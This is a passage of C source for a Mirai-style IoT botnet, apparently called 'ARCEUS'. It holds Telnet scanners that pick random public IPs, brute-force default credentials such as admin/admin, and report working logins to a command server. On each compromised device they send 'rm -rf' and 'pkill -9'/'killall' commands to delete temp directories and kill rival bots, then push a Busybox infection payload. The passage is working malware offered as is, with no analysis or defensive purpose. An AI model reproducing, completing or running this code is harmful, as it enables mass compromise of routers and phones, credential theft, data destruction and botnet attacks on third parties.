else if(miraitestrange == 2)
{
return HackerScan1();
}
else
{
return MiraiIPRanges();
}
}
}
int mirairange = 1;
in_addr_t miraifindARandomIP()
{
if(mirairange < 1 || mirairange > 2)
{
return MiraiIPRanges();
}
else
{
if(mirairange == 1){
return getRandomPublicIP();
}
else if(mirairange == 2)
{
return HackerScan1();
}
else
{
return MiraiIPRanges();
}
}
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int sclose(int fd) {
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
int echo_connect(char *host, in_port_t port){
        struct hostent *hp;
        struct sockaddr_in addr;
        int on = 1, sock;     

        if((hp = gethostbyname(host)) == NULL){
                herror("gethostbyname");
                exit(1);
        }
        bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

        if(sock == -1){
                perror("setsockopt");
                exit(1);
        }
        
        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
                perror("connect");
                exit(1);

        }
        return sock;
}
void BCMscanner() {
int maxfds = 312, i, res, j, valopt;
int max = maxfds;
char buf[128], cur_dir;
fd_set fdset;
struct timeval tv;
socklen_t lon;
srand(time(NULL) ^ rand_cmwc());
char line[256];
char* buffer;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
buffer = malloc(312 + 1);
memset(buffer, 0, 312 + 1);
struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++) {
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1;
fds[i].sockbuf = buffer; }
while(1) {
for(i = 0; i < max; i++) {
if(fds[i].tTimeout == 0) {
fds[i].tTimeout = time(NULL); }
switch(fds[i].state) {
case 0: {
if(fds[i].complete == 1) {
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
fds[i].ip = BCMSCAN(); }
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
sclose(fds[i].fd);
fds[i].complete = 1; }
else {
fds[i].state = 1;
fds[i].tTimeout = 0;
}
}
break;
case 1: {
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1) {
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
} else {
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
fds[i].tTimeout = 0;
fds[i].bufUsed = 0;
memset(fds[i].sockbuf, 0, 312);
fds[i].state = 2;
} continue; }
else if(res == -1) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 2: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 312, phone)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 3; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 3: {
if(send(fds[i].fd, "admin\r\n", 7, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 4;
}
break;
case 4: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 312, phone)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 5; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 5: {
if(send(fds[i].fd, "admin\r\n", 7, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 6; }
break;
case 6: {
if (read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 312, advances2)) {
fds[i].tTimeout = time(NULL);
if (contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
sockprintf(mainCommSock, "[ARCEUS] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								fds[i].state = 7;
} continue; }
if (fds[i].tTimeout + 7 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 7: {		
				RemoveTempDirs();
				//sockprintf(mainCommSock, "[ BCM ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				//sockprintf(mainCommSock, "[ BCM ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				
fds[i].tTimeout = time(NULL);
if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].complete = 3;
if(fds[i].tTimeout + 60 < time(NULL)) {
if(fds[i].complete !=3){
}
fds[i].state = 0;
fds[i].complete = 1;
}
break;
}
}
}
}
}
void TelnetScanner(int wait_usec, int maxfds){
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        char buf[128], cur_dir;
        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);
        struct telstate_t fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
		{
			memset(&(fds[i]), 0, sizeof(struct telstate_t));
			fds[i].complete = 1;
			fds[i].sockbuf = buffer;
        }
        while(1) {
                for(i = 0; i < max; i++) {
                        if(fds[i].tTimeout == 0) {
                                fds[i].tTimeout = time(NULL);
                        }
                        switch(fds[i].state) {
			case 0:
                {
					if(fds[i].complete == 1)
					{
						char *tmp = fds[i].sockbuf;
						memset(&(fds[i]), 0, sizeof(struct telstate_t));
						fds[i].sockbuf = tmp;
						fds[i].ip = telnetfindARandomIP();
                    }
					else if(fds[i].complete == 0)
					{
						fds[i].usernameInd++;
						fds[i].passwordInd++;
						if(fds[i].passwordInd == sizeof(Telnet_Passwords) / sizeof(char *))
						{
							fds[i].complete = 1;
							continue;
						}
						if(fds[i].usernameInd == sizeof(Telnet_Usernames) / sizeof(char *))
						{
							fds[i].complete = 1;
							continue;
						}
					}
					dest_addr.sin_family = AF_INET;
					dest_addr.sin_port = htons(23);
					memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
					dest_addr.sin_addr.s_addr = fds[i].ip;
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					if(fds[i].fd == -1) continue;
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
					{
						reset_telstate(&fds[i]);
					}
					else
					{
						advance_telstate(&fds[i], 1);
					}
                }
                break;
			case 1:
				{
					FD_ZERO(&fdset);
					FD_SET(fds[i].fd, &fdset);
					tv.tv_sec = 0;
					tv.tv_usec = wait_usec;
					res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
					if(res == 1) {
						fds[i].tTimeout = 0;
						lon = sizeof(int);
						valopt = 0;
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							reset_telstate(&fds[i]);
						}
						else
						{
							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
							advance_telstate(&fds[i], 2);
						}
						continue;
					}
					else if(res == -1)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 2:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else
						{
							advance_telstate(&fds[i], 3);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 3:
				{
					if(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], strlen(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					advance_telstate(&fds[i], 4);
				}
				break;
			case 4:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else
						{
							advance_telstate(&fds[i], 5);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;								
			case 5:
				{
					if(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], strlen(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					advance_telstate(&fds[i], 6);
				}
				break;									
			case 6:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) 
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else if(contains_success(fds[i].sockbuf))
						{
							if(fds[i].complete == 2)
							{
								advance_telstate(&fds[i], 7);
							}
							else
							{
								sockprintf(mainCommSock, "\x1b[0;31m[ARCEUS] Successfully Bruted IP: \x1b[0;33m%s\x1b[0;31m Port: \x1b[0;33m23 \x1b[0;31mUsername: \x1b[0;33m%s \x1b[0;31mPassword: \x1b[0;33m%s\x1b[0;37m", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								advance_telstate(&fds[i], 7);
							}
						}
						else
						{
							reset_telstate(&fds[i]);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 7:
			{
				char RemoveTheTempDirs [80];
				sprintf(RemoveTheTempDirs, "rm -rf %s;", Temp_Directorys);
				if(send(fds[i].fd, RemoveTheTempDirs, strlen(RemoveTheTempDirs), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
				RemoveTempDirs();
				//sockprintf(mainCommSock, "[ TELNET ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				char killtheproccesses[80];
				sprintf(killtheproccesses, "pkill -9 %s;killall -9 %s;", Bot_Killer_Binarys, Bot_Killer_Binarys);
				if(send(fds[i].fd, killtheproccesses, strlen(killtheproccesses), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
				//sockprintf(mainCommSock, "[ TELNET ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				advance_telstate(&fds[i], 8);
			}
			break;
			case 8:
				{
						fds[i].tTimeout = time(NULL);
						if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
						if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
                        if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
						//sockprintf(mainCommSock, "[ TELNET ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
						if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, "CONNECTED"))
						{
							if(strcasestr(fds[i].sockbuf, "CONNECTED") && fds[i].complete != 3)
							{
								//sockprintf(mainCommSock, "[ TELNET ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								fds[i].complete = 3;
							}
						}
						if(fds[i].tTimeout + 10 < time(NULL))
						{
							if(fds[i].complete!=3)
							{
								//sockprintf(mainCommSock, "[ TELNET ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
							}
                            reset_telstate(&fds[i]);
                        }
						break;
                }
            }
        }
    }				
}
void MiraiScanner(int wait_usec, int maxfds){
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        char buf[128], cur_dir;
        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);
        struct telstate_t fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++) {
                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }
        while(1) {
                for(i = 0; i < max; i++) {
                        if(fds[i].tTimeout == 0) {
                                fds[i].tTimeout = time(NULL);
                        }
                        switch(fds[i].state) {
			case 0:
                {
					if(fds[i].complete == 1)
					{
						char *tmp = fds[i].sockbuf;
						memset(&(fds[i]), 0, sizeof(struct telstate_t));
						fds[i].sockbuf = tmp;
						fds[i].ip = miraifindARandomIP();
					}
					else if(fds[i].complete == 0)
					{
						fds[i].usernameInd++;
						fds[i].passwordInd++;
						if(fds[i].passwordInd == sizeof(Mirai_Passwords) / sizeof(char *))
						{
							fds[i].complete = 1;
						}
						if(fds[i].usernameInd == sizeof(Mirai_Usernames) / sizeof(char *))
						{
							fds[i].complete = 1;
							continue;
						}
					}
					dest_addr.sin_family = AF_INET;
					dest_addr.sin_port = htons(23);
					memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
					dest_addr.sin_addr.s_addr = fds[i].ip;
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					if(fds[i].fd == -1) continue;
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
					{
						reset_telstate(&fds[i]);
					}
					else
					{
						advance_telstate(&fds[i], 1);
					}
                }
                break;
			case 1:
				{
					FD_ZERO(&fdset);
					FD_SET(fds[i].fd, &fdset);
					tv.tv_sec = 0;
					tv.tv_usec = wait_usec;
					res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
					if(res == 1)
					{
						fds[i].tTimeout = time(NULL);
						lon = sizeof(int);
						valopt = 0;
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							reset_telstate(&fds[i]);
						}
						else
						{
							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
							advance_telstate(&fds[i], 2);
						}
						continue;
					}
					else if(res == -1)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 2:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else
						{
							advance_telstate(&fds[i], 3);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 3:
				{
					if(send(fds[i].fd, Mirai_Usernames[fds[i].usernameInd], strlen(Mirai_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					advance_telstate(&fds[i], 4);
				}
				break;
			case 4:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else
						{
							advance_telstate(&fds[i], 5);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;								
			case 5:
				{
					if(send(fds[i].fd, Mirai_Passwords[fds[i].passwordInd], strlen(Mirai_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
					{
						reset_telstate(&fds[i]);
						continue;
					}
					advance_telstate(&fds[i], 6);
				}
				break;									
			case 6:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) //waiting for response.
					{
						fds[i].tTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf))
						{
							advance_telstate(&fds[i], 0);
						}
						else if(contains_success(fds[i].sockbuf))
						{
							if(fds[i].complete == 2)
							{
								advance_telstate(&fds[i], 7);
							}
							else
							{
								sockprintf(mainCommSock, "\x1b[0;31m[ARCEUS] Successfully Bruted IP: \x1b[0;33m%s\x1b[0;31m Port: \x1b[0;33m23 \x1b[0;31mUsername: \x1b[0;33m%s \x1b[0;31mPassword: \x1b[0;33m%s\x1b[0;37m", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
								advance_telstate(&fds[i], 7);
							}
						}
						else
						{
							reset_telstate(&fds[i]);
						}
						continue;
					}
					if(fds[i].tTimeout + 7 < time(NULL))
					{
						reset_telstate(&fds[i]);
					}
				}
				break;
			case 7:
				{
				char RemoveTheTempDirs [80];
				sprintf(RemoveTheTempDirs, "rm -rf %s;", Temp_Directorys);
				if(send(fds[i].fd, RemoveTheTempDirs, strlen(RemoveTheTempDirs), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
				RemoveTempDirs();
				//sockprintf(mainCommSock, "[ MIRAI ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				char killtheproccesses[80];
				sprintf(killtheproccesses, "pkill -9 %s;killall -9 %s;", Bot_Killer_Binarys, Bot_Killer_Binarys);
				if(send(fds[i].fd, killtheproccesses, strlen(killtheproccesses), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
				//sockprintf(mainCommSock, "[ MIRAI ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
				advance_telstate(&fds[i], 8);
				}
				break;
			case 8:
			{		
						fds[i].tTimeout = time(NULL);
						if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
						if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
						if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) { reset_telstate(&fds[i]);continue; }
						//sockprintf(mainCommSock, "[ MIRAI ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
						//int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
						if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, "connected"))
						{
							//char 	strcasestr (const char *big, const char *little)
							if(strcasestr(fds[i].sockbuf, "CONNECTED") && fds[i].complete != 3)
							{
								//sockprintf(mainCommSock, "[ MIRAI ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
							}
						}
                        if(fds[i].tTimeout + 60 < time(NULL)) 
						{	
							if(fds[i].complete!=3)
							{
								//sockprintf(mainCommSock, "[ MIRAI ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);
                            }
							reset_telstate(&fds[i]);
                        }
				break;
                }
            }
        }
    }				
}
void PhoneScanner() {
int maxfds = 253, i, res, j, valopt;
int max = maxfds;
char buf[128], cur_dir;
fd_set fdset;
struct timeval tv;
socklen_t lon;
srand(time(NULL) ^ rand_cmwc());
char line[253];
char* buffer;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
buffer = malloc(253 + 1);
memset(buffer, 0, 253 + 1);
struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++) {
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1;
fds[i].sockbuf = buffer; }
while(1) {
for(i = 0; i < max; i++) {
if(fds[i].tTimeout == 0) {
fds[i].tTimeout = time(NULL); }
switch(fds[i].state) {
case 0: {
if(fds[i].complete == 1) {
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
fds[i].ip = PhoneScan(); }
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
sclose(fds[i].fd);
fds[i].complete = 1; }
else {
fds[i].state = 1;
fds[i].tTimeout = 0;
}
}
break;
case 1: {
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1) {
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
} else {
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
fds[i].tTimeout = 0;
fds[i].bufUsed = 0;
memset(fds[i].sockbuf, 0, 253);
fds[i].state = 2;
} continue; }
else if(res == -1) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 2: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 253, phone)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 3; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 3: {
if(send(fds[i].fd, "admin\r\n", 7, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 4;
}
break;
case 4: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 253, phone)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 5; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 5: {
if(send(fds[i].fd, "admin\r\n", 7, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 6; }
break;
case 6: {
if (read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 253, advances2)) {
fds[i].tTimeout = time(NULL);
if (contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
sockprintf(mainCommSock, "\e[96m[PHONE] \e[97mFound And Infected A Phone \e[96m[%s]", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
fds[i].state = 7;
} continue; }
if (fds[i].tTimeout + 7 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 7: {
RemoveTempDirs();
//sockprintf(mainCommSock, "[ PHONE ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: admin || Password: admin", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
